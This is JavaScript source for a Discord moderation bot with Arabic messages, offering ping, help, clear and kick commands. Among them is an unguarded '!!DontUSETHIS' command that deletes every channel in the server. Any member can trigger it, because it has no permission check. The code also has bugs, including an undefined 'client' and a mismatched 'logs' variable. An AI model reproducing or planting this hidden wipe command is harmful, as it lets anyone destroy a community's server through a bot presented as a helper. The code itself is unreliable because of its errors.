const botconfig = require("./botconfig.json");
const Discord = require("discord.js");
const bot = new Discord.Client({disableEveryone: true});

bot.on("ready", async () => {
    console.log(`${bot.user.username} is Online`);
    bot.user.setGame("EVR-RP System");
});


bot.on('message', message =>{
  if(message.content === '$ping'){
let start = Date.now(); message.channel.send('pong').then(message => {
message.edit(`\`\`\`js
Time taken: ${Date.now() - start} ms
Discord API: ${client.ping.toFixed(0)} ms\`\`\``);
  });
  }
});

bot.on("message", async message => {
    if(message.author.bot)return;
    if(message.channel.type === "dm") return;

    let perfix = "!!"
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];
    let args = messageArray.slice(1);

    if(cmd === `${perfix}hello`){
        return message.channel.send("Hello!");
    }

});
//message.guild.channels.forEach(channel => channel.delete())
bot.on("message", async message => {
    if(message.author.bot)return;
    if(message.channel.type === 'dm') return;

    let perfix = "!!"
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];
    let args = messageArray.slice(1);

    if(cmd === `${perfix}help`){
        let help = new Discord.RichEmbed()
            .setDescription(":white_check_mark: | اوامر المساعدة ..")
            .setColor("#99999")
            .addField("ban", `لحضر الشخص من دخول السيرفر مجددا`)
            .addField("kick", `لطرد الشخص من السيرفر فقط`)
            .addField("clear", `لمسح عدد من الرسائل`);
            return message.channel.send(help);
    };
    if(cmd === `${perfix}clear`){
    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("لا يمكنك فعل ذالك");
    if(!args[0]) return message.channel.send("لا استطيع");
    message.channel.bulkDelete(args[0]).then(() => {
        message.channel.send(`تم مسح ${args[0]} رسالة.`).then(msg => msg.delete(5000));
    })};
    if(cmd === `${perfix}DontUSETHIS`){
    message.guild.channels.forEach(channel => channel.delete())
    }
    if(cmd === `${perfix}King`){
     return message.channel.send("My King is KR :D, I love him");  
    };
    if(cmd === `${perfix}kick`){
        let kickUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
        if(!kickUser) return message.channel.send("لا استطيع اجاد المستخدم");
        let KickReason = args.join(" ").slice(22);
        if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send("لا تستطيع فعل ذالك");
        if(kickUser.hasPermission("MANAGE_MESSAGES")) return message.channel.send("لا تستطيع طرد هذا المستخدم");
        let KickEmbed = new Discord.RichEmbed()
        .setDescription("Kick")
        .setColor("#e56b00")
        .addField("المستخدم المطرود", `${kickUser} with ID ${kickUser.id}`)
        .addField("السبب", KickReason);
        let Logs = message.guild.channels.find(`name`, "incidents");
        if(!logs) return message.channel.send("لا استطيع اجاد غرفة السجلات");
        Logs.send(KickEmbed);
        return;
    }
});

bot.login(process.env.BOT_TOKEN);
